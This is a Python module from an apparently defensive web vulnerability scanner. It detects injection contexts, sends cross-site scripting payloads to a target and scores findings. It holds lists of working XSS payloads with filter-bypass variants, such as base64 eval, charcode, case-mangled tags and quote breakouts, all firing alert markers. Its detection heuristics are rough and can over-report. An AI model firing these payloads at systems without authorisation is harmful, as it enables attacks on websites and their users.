"""
Advanced XSS Testing Module

Tests for reflected, stored, and DOM-based cross-site scripting vulnerabilities.
Implements context-aware payload generation and detection across multiple contexts.
"""

import re
import json
import html
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import time
import requests
from urllib.parse import urlencode, quote, unquote
import logging
from .confidence_scorer import ConfidenceScorer, ConfidenceLevel

logger = logging.getLogger(__name__)


class XSSContext(Enum):
    """HTML contexts where XSS payloads are tested"""
    HTML = "html"
    JAVASCRIPT = "javascript"
    ATTRIBUTE = "attribute"
    CSS = "css"
    URL = "url"


@dataclass
class XSSPayload:
    """Represents an XSS payload variant for a specific context"""
    payload: str
    context: XSSContext
    marker: str  # Unique marker to detect if payload executed
    bypass_type: str  # basic, encoding, null_byte, case_manipulation, etc.
    description: str


class XSSContextAnalyzer:
    """Analyzes HTML to determine context and suggest payloads"""

    @staticmethod
    def detect_context(html_content: str, parameter_name: str) -> List[XSSContext]:
        """
        Detect how a parameter appears in HTML to determine attack context.
        Looks for the parameter value in the response.
        """
        contexts = []
        
        # HTML tag context: <tag ...parameter=value...>
        if re.search(rf'<[\w]+\s+[^>]*{re.escape(parameter_name)}["\']?=', html_content, re.IGNORECASE):
            contexts.append(XSSContext.HTML)
        
        # Attribute context: attribute="...value..."
        if re.search(rf'(on\w+|href|src|style|data-[\w-]+)\s*=\s*["\']', html_content):
            contexts.append(XSSContext.ATTRIBUTE)
        
        # JavaScript context: var x = "value"; or x = "value"
        if re.search(rf'(var|let|const|=)\s*["\']([^"\']*)?{re.escape(parameter_name)}([^"\']*)?["\']', html_content):
            contexts.append(XSSContext.JAVASCRIPT)
        
        # URL context: href="...?param=value" or src="...?param=value"
        if re.search(rf'(href|src|action)\s*=\s*["\']([^"\']*\?[^"\']*{re.escape(parameter_name)}[^"\']*)["\']', html_content):
            contexts.append(XSSContext.URL)
        
        # CSS context: style="property: value;"
        if re.search(rf'style\s*=\s*["\']([^"\']*){re.escape(parameter_name)}([^"\']*)["\']', html_content):
            contexts.append(XSSContext.CSS)
        
        # Default to HTML context if not found
        if not contexts:
            contexts.append(XSSContext.HTML)
        
        return list(set(contexts))  # Deduplicate

    @staticmethod
    def extract_context_around_param(html_content: str, parameter_name: str, radius: int = 100) -> str:
        """Extract HTML context around where parameter appears"""
        idx = html_content.lower().find(parameter_name.lower())
        if idx == -1:
            return ""
        
        start = max(0, idx - radius)
        end = min(len(html_content), idx + len(parameter_name) + radius)
        return html_content[start:end]


class XSSPayloadGenerator:
    """Generates context-specific XSS payloads"""

    @staticmethod
    def generate_payloads(context: XSSContext, depth: int = 1) -> List[XSSPayload]:
        """
        Generate XSS payloads for given context.
        depth: 1=basic, 2=extended (bypasses), 3=advanced (rare bypasses)
        """
        payloads = []
        marker_base = "XSSVULN"

        if context == XSSContext.HTML:
            payloads.extend([
                XSSPayload(
                    payload='<script>alert("XSSVULN")</script>',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Basic script tag injection"
                ),
                XSSPayload(
                    payload='<img src=x onerror="alert(\'XSSVULN\')">',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Image tag with onerror handler"
                ),
                XSSPayload(
                    payload='<svg onload="alert(\'XSSVULN\')"></svg>',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="SVG with onload handler"
                ),
                XSSPayload(
                    payload='<body onload="alert(\'XSSVULN\')">',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Body tag with onload"
                ),
            ])
            
            if depth >= 2:
                payloads.extend([
                    XSSPayload(
                        payload='<IfRAme src="x" OnLoAd="alert(\'XSSVULN\')">',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="case_manipulation",
                        description="Case manipulation bypass"
                    ),
                    XSSPayload(
                        payload='<script>eval(atob("YWxlcnQoJ1hTU1ZVTE4nKQ=="))</script>',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="encoding",
                        description="Base64 encoded payload"
                    ),
                    XSSPayload(
                        payload='<img src=x onerror=alert(String.fromCharCode(88,83,83,86,85,76,78))>',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="encoding",
                        description="Charcode encoding bypass"
                    ),
                    XSSPayload(
                        payload='<script src="data:text/javascript,alert(\'XSSVULN\')"></script>',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="data_uri",
                        description="Data URI payload"
                    ),
                ])

            if depth >= 3:
                payloads.extend([
                    XSSPayload(
                        payload='<img src=x onerror="\x00alert(\'XSSVULN\')">',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="null_byte",
                        description="Null byte bypass (rare)"
                    ),
                    XSSPayload(
                        payload='<script>var x="XSSVULN";console.log(x)</script>',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="console_output",
                        description="Console output marker"
                    ),
                ])

        elif context == XSSContext.JAVASCRIPT:
            payloads.extend([
                XSSPayload(
                    payload='";alert("XSSVULN");"',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Quote breakout + alert"
                ),
                XSSPayload(
                    payload="';alert('XSSVULN');'",
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Single quote breakout + alert"
                ),
                XSSPayload(
                    payload='</script><script>alert("XSSVULN")</script>',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Script tag breakout"
                ),
            ])

            if depth >= 2:
                payloads.extend([
                    XSSPayload(
                        payload='"+alert(String.fromCharCode(88,83,83,86,85,76,78))+"',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="encoding",
                        description="Charcode encoding in JS"
                    ),
                    XSSPayload(
                        payload='";alert(eval(atob("WFNTVlVMTg==")));"',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="encoding",
                        description="Base64 + eval in JS"
                    ),
                ])

        elif context == XSSContext.ATTRIBUTE:
            payloads.extend([
                XSSPayload(
                    payload='" onload="alert(\'XSSVULN\')',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Quote breakout + event handler"
                ),
                XSSPayload(
                    payload="' onload='alert(\"XSSVULN\")",
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Single quote breakout + event"
                ),
                XSSPayload(
                    payload='" style="background:url(javascript:alert(\'XSSVULN\'))',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="Expression in style attribute"
                ),
            ])

            if depth >= 2:
                payloads.extend([
                    XSSPayload(
                        payload='" oNLoAd="alert(\'XSSVULN\')',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="case_manipulation",
                        description="Case insensitive event handler"
                    ),
                    XSSPayload(
                        payload='" autofocus onfocus="alert(\'XSSVULN\')',
                        context=context,
                        marker="XSSVULN",
                        bypass_type="autofocus",
                        description="Autofocus trigger"
                    ),
                ])

        elif context == XSSContext.CSS:
            payloads.extend([
                XSSPayload(
                    payload='";alert("XSSVULN");width:"',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="CSS property injection"
                ),
                XSSPayload(
                    payload='";expression(alert("XSSVULN"));width:"',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="CSS expression (IE)"
                ),
                XSSPayload(
                    payload='background:url(javascript:alert("XSSVULN"))',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="JavaScript URL in background"
                ),
            ])

        elif context == XSSContext.URL:
            payloads.extend([
                XSSPayload(
                    payload='javascript:alert("XSSVULN")',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="basic",
                    description="JavaScript protocol"
                ),
                XSSPayload(
                    payload='data:text/html,<script>alert("XSSVULN")</script>',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="data_uri",
                    description="Data URI with HTML"
                ),
                XSSPayload(
                    payload='jAvAsCrIpT:alert("XSSVULN")',
                    context=context,
                    marker="XSSVULN",
                    bypass_type="case_manipulation",
                    description="Case manipulation of protocol"
                ),
            ])

        return payloads


class XSSDetector:
    """Detects if XSS payload was successfully executed"""

    @staticmethod
    def detect_reflected_xss(response_text: str, payload: str, marker: str) -> bool:
        """
        Detect if XSS payload is reflected in response.
        Checks for:
        - Exact marker in response
        - HTML-encoded marker
        - Partial payload without escaping
        """
        if marker in response_text:
            return True

        # Check for HTML-encoded marker
        encoded_marker = html.escape(marker)
        if encoded_marker in response_text and payload not in response_text:
            return False  # Marker is escaped, not vulnerable

        # Check for partial payload (dangerous pattern)
        # Extract key non-alphanumeric parts of payload
        dangerous_parts = re.findall(r'[^\w\s]', payload)
        if len(dangerous_parts) > 0:
            first_part = payload.split(dangerous_parts[0])[0] if len(payload) > 5 else ""
            if first_part and first_part in response_text and len(first_part) > 3:
                return True

        return False

    @staticmethod
    def detect_xss_vulnerability(response_text: str, payload: str, marker: str,
                                response_headers: Dict[str, str] = None) -> Tuple[bool, str]:
        """
        Comprehensive XSS detection.
        Returns (is_vulnerable, evidence)
        """
        evidence = ""

        # Check 1: Direct marker detection
        if marker in response_text:
            evidence = f"Marker '{marker}' found in response"
            return True, evidence

        # Check 2: Unescaped payload presence
        if payload in response_text:
            evidence = f"Unescaped payload found in response: {payload[:50]}..."
            return True, evidence

        # Check 3: HTML-encoded XSS (dangerous indicator)
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text:
            # If encoded, it's usually safe UNLESS it's in a script context
            if "<script>" not in response_text.lower():
                return False, "Payload is HTML-encoded (likely safe)"
            evidence = "Payload is HTML-encoded but in script context"
            return True, evidence

        # Check 4: JavaScript context - look for quote breakout success
        if '";' in payload or "\"'" in payload:
            # Check if the pattern appears unescaped
            breakout = payload.split('";')[0] if '";' in payload else payload.split("'")[0]
            if breakout and len(breakout) > 2:
                if breakout in response_text:
                    evidence = f"Quote breakout detected: {breakout}"
                    return True, evidence

        return False, evidence

    @staticmethod
    def check_content_security_policy(response_headers: Dict[str, str]) -> Tuple[bool, str]:
        """
        Check if CSP header is present and may block XSS.
        Returns (is_csp_present, description)
        """
        if not response_headers:
            return False, "No CSP header"

        csp = response_headers.get("Content-Security-Policy") or response_headers.get("X-Content-Security-Policy")
        
        if not csp:
            return False, "No CSP header present - vulnerable to inline XSS"

        # Check CSP strength
        if "unsafe-inline" in csp.lower():
            return False, "CSP allows 'unsafe-inline' - vulnerable to XSS"

        return True, f"CSP present: {csp[:80]}..."


class XSSTester:
    """Comprehensive XSS vulnerability tester"""

    def __init__(self, timeout: float = 10.0, verify_ssl: bool = True):
        """
        Initialize XSS tester.
        
        Args:
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.findings: List[Dict[str, Any]] = []

    def test_endpoint_xss(self, url: str, method: str = "GET", 
                          parameters: Dict[str, str] = None,
                          depth: int = 1,
                          cookies: Dict[str, str] = None,
                          headers: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """
        Test a single endpoint for XSS vulnerabilities.
        Tests all parameters in different contexts.
        
        Args:
            url: Target URL
            method: HTTP method (GET, POST)
            parameters: Dictionary of parameters to test
            depth: Payload depth (1=basic, 2=extended, 3=advanced)
            cookies: Session cookies
            headers: Custom headers
            
        Returns:
            List of XSS findings
        """
        findings = []

        if not parameters:
            return findings

        for param_name, param_value in parameters.items():
            param_findings = self.test_parameter_xss(
                url=url,
                method=method,
                parameter_name=param_name,
                parameter_value=param_value,
                depth=depth,
                cookies=cookies,
                headers=headers
            )
            findings.extend(param_findings)

        return findings

    def test_parameter_xss(self, url: str, method: str, 
                           parameter_name: str, parameter_value: str,
                           depth: int = 1,
                           cookies: Dict[str, str] = None,
                           headers: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """Test a single parameter for XSS"""
        findings = []
        base_headers = headers or {}

        try:
            # First, get baseline response to understand context
            baseline_resp = self._make_request(url, method, {parameter_name: parameter_value}, 
                                              cookies, base_headers)
            
            if baseline_resp is None:
                return findings

            # Analyze context in baseline response
            contexts = XSSContextAnalyzer.detect_context(baseline_resp.text, parameter_name)
            
            # Generate payloads for detected contexts
            all_payloads = []
            for context in contexts:
                context_payloads = XSSPayloadGenerator.generate_payloads(context, depth)
                all_payloads.extend(context_payloads)

            # Test each payload
            for payload_obj in all_payloads:
                test_params = {parameter_name: payload_obj.payload}
                
                try:
                    response = self._make_request(url, method, test_params, cookies, base_headers)
                    
                    if response is None:
                        continue

                    # Detect if payload executed
                    is_vulnerable, evidence = XSSDetector.detect_xss_vulnerability(
                        response.text,
                        payload_obj.payload,
                        payload_obj.marker,
                        dict(response.headers)
                    )

                    if is_vulnerable:
                        # Check CSP
                        csp_present, csp_desc = XSSDetector.check_content_security_policy(
                            dict(response.headers)
                        )

                        # Determine detection methods based on what was detected
                        detection_methods = []
                        detection_results = {}
                        
                        # Check for marker reflection
                        if payload_obj.marker in response.text:
                            detection_methods.append("marker_reflected")
                            detection_results["marker_reflected"] = True
                        
                        # Check for unescaped markup
                        if payload_obj.payload in response.text:
                            detection_methods.append("markup_found")
                            detection_results["markup_found"] = True
                        
                        # Default to marker if no specific detection found
                        if not detection_methods:
                            detection_methods = ["marker_reflected"]
                            detection_results["marker_reflected"] = True
                        
                        # Calculate confidence score
                        conf_score, conf_level = ConfidenceScorer.calculate_confidence(
                            "Cross-Site Scripting",
                            detection_methods,
                            detection_results,
                            {
                                "response_status": "unexpected",
                                "reproducible": True,
                                "payload_complexity": "complex" if any(c in payload_obj.payload for c in ['%', '\\', '"']) else "normal"
                            }
                        )

                        finding = {
                            "type": "Reflected XSS" if "reflected" in str(payload_obj.description).lower() else "XSS",
                            "severity": "Critical" if not csp_present else "High",
                            "url": url,
                            "method": method,
                            "parameter": parameter_name,
                            "payload": payload_obj.payload,
                            "context": payload_obj.context.value,
                            "bypass_type": payload_obj.bypass_type,
                            "evidence": evidence,
                            "csp_status": csp_desc,
                            "response_snippet": response.text[:200],
                            "status_code": response.status_code,
                            "confidence_score": conf_score,
                            "confidence_level": conf_level,
                            "detection_methods": detection_methods,
                            "verification_steps": ConfidenceScorer.get_verification_hints(
                                "Cross-Site Scripting", url, parameter_name, "_".join(detection_methods)
                            ),
                            "false_positive_risk": ConfidenceScorer.get_false_positive_risk(
                                "Cross-Site Scripting", detection_methods, conf_score
                            ),
                        }
                        findings.append(finding)
                        logger.info(f"XSS vulnerability found: {parameter_name} @ {url} (Confidence: {conf_level})")

                except requests.RequestException as e:
                    logger.debug(f"Error testing payload: {e}")
                    continue

        except requests.RequestException as e:
            logger.debug(f"Error in XSS test: {e}")

        return findings

    def _make_request(self, url: str, method: str, params: Dict[str, str],
                     cookies: Dict[str, str] = None,
                     headers: Dict[str, str] = None) -> Optional[requests.Response]:
        """Make HTTP request with payload"""
        try:
            req_headers = {"User-Agent": "VAPT-Scanner/1.0"} | (headers or {})

            if method.upper() == "GET":
                response = requests.get(
                    url,
                    params=params,
                    cookies=cookies,
                    headers=req_headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=True
                )
            else:  # POST
                response = requests.post(
                    url,
                    data=params,
                    cookies=cookies,
                    headers=req_headers,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=True
                )

            return response

        except requests.RequestException as e:
            logger.debug(f"Request failed: {e}")
            return None

    def test_dom_based_xss(self, url: str, headers: Dict[str, str] = None) -> List[Dict[str, Any]]:
        """
        Detect DOM-based XSS vulnerabilities by analyzing JavaScript.
        Looks for patterns where user input reaches dangerous sinks without sanitization.
        
        Returns findings for potential DOM-based XSS sources/sinks
        """
        findings = []

        try:
            response = requests.get(
                url,
                headers={"User-Agent": "VAPT-Scanner/1.0"} | (headers or {}),
                timeout=self.timeout,
                verify=self.verify_ssl
            )

            # Patterns for dangerous sources (user input)
            source_patterns = [
                r'location\s*\.\s*hash',
                r'location\s*\.\s*search',
                r'window\s*\.\s*name',
                r'document\s*\.\s*referrer',
                r'location\s*\.\s*href',
            ]

            # Patterns for dangerous sinks (outputs)
            sink_patterns = [
                r'\.innerHTML\s*=',
                r'\.outerHTML\s*=',
                r'\.write\s*\(',
                r'\.writeln\s*\(',
                r'\.insertAdjacentHTML',
                r'eval\s*\(',
                r'setTimeout\s*\(',
                r'setInterval\s*\(',
            ]

            # Simple regex-based detection
            for source in source_patterns:
                if re.search(source, response.text):
                    for sink in sink_patterns:
                        if re.search(sink, response.text):
                            # Both source and sink present
                            detection_methods = ["dom_based"]
                            detection_results = {
                                "source_detected": True,
                                "sink_detected": True
                            }
                            
                            # Calculate confidence score for DOM-based XSS
                            conf_score, conf_level = ConfidenceScorer.calculate_confidence(
                                "Cross-Site Scripting",
                                detection_methods,
                                detection_results,
                                {
                                    "response_status": "unexpected",
                                    "reproducible": False  # DOM vulnerabilities require runtime verification
                                }
                            )
                            
                            finding = {
                                "type": "DOM-based XSS (Potential)",
                                "severity": "High",
                                "url": url,
                                "method": "GET",
                                "evidence": "User input source detected with dangerous sink",
                                "source_pattern": source,
                                "sink_pattern": sink,
                                "note": "Requires manual verification - automated DOM analysis is limited",
                                "confidence_score": conf_score,
                                "confidence_level": conf_level,
                                "detection_methods": detection_methods,
                                "verification_steps": ConfidenceScorer.get_verification_hints(
                                    "Cross-Site Scripting", url, "source", "dom_based"
                                ),
                                "false_positive_risk": ConfidenceScorer.get_false_positive_risk(
                                    "Cross-Site Scripting", detection_methods, conf_score
                                ),
                            }
                            findings.append(finding)
                            break

        except requests.RequestException as e:
            logger.debug(f"DOM XSS analysis failed: {e}")

        return findings
